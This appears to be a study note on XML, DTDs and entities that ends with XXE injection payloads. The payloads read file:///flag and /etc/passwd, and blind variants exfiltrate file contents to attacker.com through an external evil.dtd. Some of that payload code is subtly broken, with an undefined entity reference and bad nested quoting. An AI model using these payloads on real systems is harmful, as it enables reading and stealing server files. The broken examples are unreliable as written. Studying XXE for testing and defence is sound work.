# XML
* eXtensible Markup Language


* Sample XML 
```xml
<message>
    <to>Alice</to>
    <from>Bob</from>
    <subject>Test</subject>
    <body>Hello World</body>
</message>
```

## DTD
* Document Type Definition, defines the structure of an `XML` document. It is placed before the actual `XML` content.


### Internal DTD
```xml
<?xml version="1.0"?>
<!DOCTYPE message[
    <!ELEMENT message (to,from,subject,body)>
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT subject (#PCDATA)>
    <!ELEMENT body (#PCDATA)>
]>
<message>
    <to>Alice</to>
    <from>Bob</from>
    <subject>Test</subject>
    <body>Hello World</body>
</message>
```

* `<!DOCTYPE>`: the root element of this document is `message`
* `<!ELEMENT message>`: Each `message` element must contain these four elements: `to`, `from`, `subject`, `body`.
* `#PCDATA`: Parsed Character Data

### External DTD
```xml
<?xml version="1.0"?>
<!DOCTYPE message SYSTEM "message.dtd">
<message>
    <to>Alice</to>
    <from>Bob</from>
    <subject>Test</subject>
    <body>Hello World</body>
</message>
```
* The `DTD` of this xml file is imported from `message.dtd` with `SYSTEM` keyword.
* `SYSTEM` specifies the inclusion of an external file into `XML`, can be from `URI` or `URL`


## DTD Entities
* Entities are like variables, and they live inside `DTD` block. We can declare entities and use them later with `&` and `;` symbol before the entity name.
* They are always reference the entity begin with `&` and end with `;`

### Internal DTD Entity
* They must be enclosed by `DOCTYPE`!
```xml
<!DOCTYPE pwn [
<!ENTITY email "some@email.com">
<!ENTITY author "Alice &email;">
]>
<author>&author;</author>
```

Result `XML` data:
```
<author>Alice some@email.com</author>
```

### External DTD Entity
* They must be enclosed by `DOCTYPE`!
```xml
<!DOCTYPE pwn [
<!ENTITY author SYSTEM "http://example.com/entities.dtd">
]>
<author>&author;</author>
```


### Parameter Entity, aka Embedded Entity
* We can define an `entity` with a entity definition. When `&outer` is called, it is parsed like `<!ENTITY inner 'My name is Alice'>`
```xml
<!ENTITY name "Alice">
<!ENTITY outer "<!ENTITY inner 'My name is &name;'>">
&outer;
```

* Another example
```xml
<!ENTITY name "Alice">
<!ENTITY outer "<!ENTITY inner 'My name is &name;'>">
&outer;
```
# Simple XXE payload
* `%26` is `&` urlencoded.
```xml
<!DOCTYPE wrapper [<!ENTITY pwn SYSTEM "file:///flag">]> <a>%26pwn;</a>
```
# Blind XXE injections
* Since we can't directly reference an Entity within an internal DTD, we have to make use an external DTD. `XXE` is also known as `XML external entity` injection
```xml
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
<data>&send;</data>
```
* `evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY send SYSTEM "http://attacker.com/?passwd=%passwd;">">
%wrapper;
```

# Blind XXE injection with file content containing `<`
* We will use `CDATA`, character data to bypass this.
* Anything between `<![CDATA[ ` and `]]>` will not be parsed by the XML parser
* `evil.dtd`
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
%wrapper;
<!ENTITY % wrapper_send "<!ENTITY send SYSTEM "http://attacker.com/?passwd=%wrapper;">">
%wrapper_send;
```


